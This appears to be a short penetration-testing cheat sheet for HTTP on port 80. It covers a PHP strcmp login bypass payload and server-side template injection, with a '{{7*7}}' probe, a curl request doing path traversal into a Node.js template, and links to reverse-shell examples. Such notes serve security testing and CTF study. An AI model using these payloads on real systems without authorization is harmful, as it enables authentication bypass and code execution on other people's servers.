# Port 80/tcp
## Stardard usage
 - HTTP protocol
<hr>
#### PHP strcmp Bypass
- #### Description
  - if strcmp used in authentication by php, it is possible to bypass by this tecque.
- #### PoC
  -  Payload: `username=admin&password[]=`
  - Resource: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016 

#### Server Side Template Injection (SSTI)
- #### Description
  - To use native template syntax to inject a malicious payload into a template, which is then executed server-side.
- #### PoC
  - Resource: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  - Exmaple 1: `Pass {{7*7}} in any input`
  - Example 2 (nodejs): `curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://$targetip/'`
  - Example 3 (reverse shell): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
  - Exmaple 4 (Jinja2 python): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
